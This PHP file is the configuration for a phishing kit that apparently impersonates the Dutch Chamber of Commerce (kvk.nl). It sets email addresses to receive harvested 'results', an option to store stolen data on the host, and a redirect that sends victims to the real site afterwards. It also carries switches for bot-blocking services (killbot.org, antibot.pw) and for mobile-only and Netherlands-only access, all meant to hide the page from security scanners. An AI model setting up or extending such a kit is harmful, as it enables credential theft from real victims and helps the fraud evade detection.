<?php
error_reporting(0);
// @Underestimated11 on telegram
$to = "ikchop03@yahoo.com,everydaychop@protonmail.com"; // your results email here
$saveonhost = 0; // save a copy of results on host // 1 for enable and 0 for disable

$ExitLink = "https://www.kvk.nl";


// some blockers

$One_Time_Access = 0; //1 for enable and 0 for disable

$internal_antibot = 1;

$enable_killbot = 0; // this one uses killbot.org blocker // 1 to enable and 0 to disable
$killbot_key = ''; // external blocker api key u get from here after u topup your balance https://killbot.org/developer [ required if killbot.org is enabled ]

$external_antibot = 0; // this one uses antibot.pw blocker // 1 to enable and 0 to disable
$apikey = ''; // external blocker api key u get from here after u topup your balance https://antibot.pw/dashboard/developers [ required if antibot.pw is enabled ]

$mobile_lock = 0; // 1 to enable and 0 to disable
$NL_lock = 0;  //1 for enable and 0 for disable (free api may not be accurate)


?>